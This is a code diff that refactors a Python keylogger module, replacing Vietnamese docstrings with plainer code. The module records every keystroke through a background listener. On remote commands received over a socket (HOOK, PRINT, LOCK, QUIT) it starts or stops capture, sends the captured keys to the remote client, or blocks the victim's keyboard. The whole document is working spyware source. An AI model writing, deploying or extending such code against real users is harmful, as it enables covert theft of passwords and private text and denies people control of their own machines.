@@ -1,119 +1,71 @@
+import threading
 import keyboard
-from pynput.keyboard import Listener 
-from constant import *
+from pynput.keyboard import Listener
 
-# = = = = = # = = = = = # = = = = = # GLOBAL CONSTANTS # = = = = = # = = = = = # = = = = = #
+BUFFER_SIZE = 1024 * 4
+SPACE_KEY = 'Key.space'
+SINGLE_QUOTE = "''"
 
-KEY_MAPPING = {
-    'Key.space': ' ',
-    '"\'"': "'"
-}
+FLAG_HOOK = 1
+FLAG_UNHOOK = 2
+FLAG_QUIT = 4
 
-# = = = = = # = = = = = # = = = = = # GLOBAL VARIABLES # = = = = = # = = = = = # = = = = = #
-
-#@param cont: chuỗi các ký tự bắt được từ client
-cont = " "
-# 
-flag = 0
-# ...
-islock = 0
-# ...
-ishook = 0
-
-# = = = = = # = = = = = # = = = = = # CORE FUNCTIONS # = = = = = # = = = = = # = = = = = #
-
-def keylogger(key):
-    """
-    Hàm dùng để bắt những phím được nhấn bởi người dùng. 
-    Nó sẽ tìm các key tương ứng với từng ký tự 
-    sử dụng KEY_MAPPING dict
-    """
-    global cont, flag
-    if flag == 4:
+def log_key(key):
+    global logged_keys, flag
+    if flag == FLAG_QUIT:
         return False
-    if flag == 1:
-        key = str(key)
-        cont += KEY_MAPPING.get(key, key.replace("'", ""))
+    if flag == FLAG_HOOK:
+        temp = str(key)
+        if temp == SPACE_KEY:
+            temp = ' '
+        elif temp == SINGLE_QUOTE:
+            temp = "'"
+        else:
+            temp = temp.replace("'", "")
+        logged_keys += str(temp)
+    return
 
-def send_keystrokes(client):
-    """
-    Hàm có nhiệm vụ gửi lại client chuỗi các phím đã bắt được. 
-    Nó cũng xử lý các ngoại lệ xảy ra trong quá trình kết nối.
-    """
-    global cont
-    try:
-        client.sendall(bytes(cont, ENCODE_FORMAT))
-    except Exception as e:
-        print(f"Failed to send keystrokes: {e}")
-    finally:
-        cont = " "
+def send_logged_keys(client):
+    global logged_keys
+    client.sendall(bytes(logged_keys, "utf8"))
+    logged_keys = " "
 
-def lock_keyboard():
-    """
-    Hàm có chức năng khóa các phím trên bàn phím (lên đến 150 phím). 
-    """
-    global islock
-    if not islock:
-        for i in range(150):
+def listen_keys():
+    with Listener(on_press = log_key) as listener:
+        listener.join()
+    return
+
+def toggle_lock():
+    global is_locked
+    for i in range(150):
+        if is_locked == 0:
             keyboard.block_key(i)
-        islock = 1
-
-def unlock_keyboard():
-    """
-    Hàm này có chức năng bỏ khóa các phím trên bàn phím (lên đến 150 phím). 
-    """
-    global islock
-    if islock:
-        for i in range(150):
+        else:
             keyboard.unblock_key(i)
-        islock = 0
-
-def listen():
-    """
-    Hàm này sẽ khởi tạo một listener để nghe các phím mà người dùng nhập
-    và truyền vào hàm keylogger.
-    """
-    with Listener(on_press = keylogger) as listener:
-        listener.join()  
-
-def toggle_lock(argument):
-    """
-    Hàm này sẽ xác định trạng thái khóa của bàn phím (KHÓA hay BỊ KHÓA). 
-    Nó sẽ gọi hàm lock_keyboard hoặc unlock_keyboard tùy thuộc vào trạng thái hiện tại 
-    """
-    global islock
-    if islock:
-        unlock_keyboard()
-    else:
-        lock_keyboard()
-
-def toggle_hook(argument):
-    """
-    Hàm này xác định trạng thái hoạt động của key logger
-    Nếu key logger đang hoạt động, thì sẽ dừng key logger.
-    Nếu key logger đang tắt, khởi động key logger.
-    """
-    global flag, ishook
-    if ishook == 0:
-        flag = 1
-        ishook = 1
-    else:
-        flag = 2
-        ishook = 0
+    is_locked = 1 if is_locked == 0 else 0
+    return
 
 def keylog(client):
-    """
-    Hàm này sẽ lắng nghe lệnh từ client và thực hiện các hành động tương ứng
-    """
-    global cont, flag, islock, ishook
-    COMMAND_MAPPING = {
-        "HOOK": toggle_hook,
-        "PRINT": send_keystrokes,
-        "LOCK": toggle_lock,
-        "QUIT": quit
-    }
+    global logged_keys, flag, is_locked, is_hooked
+    is_locked = 0
+    is_hooked = 0
+    threading.Thread(target = listen_keys).start()
+    flag = 0
+    logged_keys = " "
+    message = ""
     while True:
-        message = client.recv(BUFFER_SIZE).decode(ENCODE_FORMAT)
-        command = COMMAND_MAPPING.get(message)
-        if command:
-            command(client)
+        message = client.recv(BUFFER_SIZE).decode("utf8")
+        if "HOOK" in message:
+            if is_hooked == 0:
+                flag = FLAG_HOOK
+                is_hooked = 1
+            else:
+                flag = FLAG_UNHOOK
+                is_hooked = 0
+        elif "PRINT" in message:
+            send_logged_keys(client)
+        elif "LOCK" in message:
+            toggle_lock()
+        elif "QUIT" in message:
+            flag = FLAG_QUIT
+            return
